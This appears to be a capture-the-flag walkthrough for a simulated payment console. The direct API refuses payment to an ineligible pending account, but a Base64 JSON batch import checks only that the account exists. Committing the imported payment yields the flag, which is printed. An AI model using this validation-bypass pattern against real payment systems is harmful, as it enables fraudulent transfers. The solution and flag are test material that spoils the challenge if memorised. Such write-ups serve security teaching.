# Cleared by Existence
Enumerate the interfaces

HELP
SHOW OBJECTIVE
SHOW ACCOUNTS
SHOW API
SHOW IMPORT FORMAT

Record these values:

• The account labeled PENDING ACCOUNT
• The objective amount of 1200000 minor units
• The currency KES
• The documented JSON schema

Test the direct path

Use the actual pending account number:

CREATE PAYMENT ACCOUNT PENDING_ACCOUNT AMOUNT 1200000

Expected result:

403 BENEFICIARY NOT ELIGIBLE
STATUS PENDING
CAN-RECEIVE false
VALIDATION PATH direct-api

This establishes that the direct interface enforces beneficiary eligibility.

Build the import document

Create a compact JSON document using the pending account and objective amount. The settlement reference must contain 3 to 64 letters, numbers, underscores, or hyphens.

{"version":1,"payments":[{"reference":"SETTLEMENT_001","account":"PENDING_ACCOUNT","currency":"KES","amount_minor":1200000}]}

Replace PENDING_ACCOUNT with the actual account number before encoding the JSON as Base64.

Example on Linux:

printf '%s' '{"version":1,"payments":[{"reference":"SETTLEMENT_001","account":"PENDING_ACCOUNT","currency":"KES","amount_minor":1200000}]}' | base64 -w 0

The challenge accepts standard Base64 with or without final padding.

Import through the alternate interface

Submit the encoded value using the syntax listed by HELP and SHOW API:

IMPORT BATCH BASE64_VALUE

Expected response:

202 BATCH ACCEPTED
PAYMENT P-XXXXXXXX
REFERENCE SETTLEMENT_001
ACCOUNT PENDING_ACCOUNT
AMOUNT MINOR 1200000
VALIDATION PATH batch-import
VALIDATION RESULT account-exists
STATUS QUEUED

The important inconsistency is:

direct-api   -> beneficiary eligibility
batch-import -> account existence only

Commit the imported payment

Inspect the queue if needed:

SHOW QUEUE
SHOW PAYMENT PAYMENT_ID

Commit the payment ID returned by the import:

COMMIT PAYMENT PAYMENT_ID

Successful result:

200 PAYMENT COMMITTED
CREDITED MINOR 1200000
flag{inm_exists_does_not_mean_eligible}

Duplicate-reference behavior

A second imported payment using the same reference, including a case variation, returns:

409 DUPLICATE SETTLEMENT REFERENCE

Use a different reference for another import attempt.
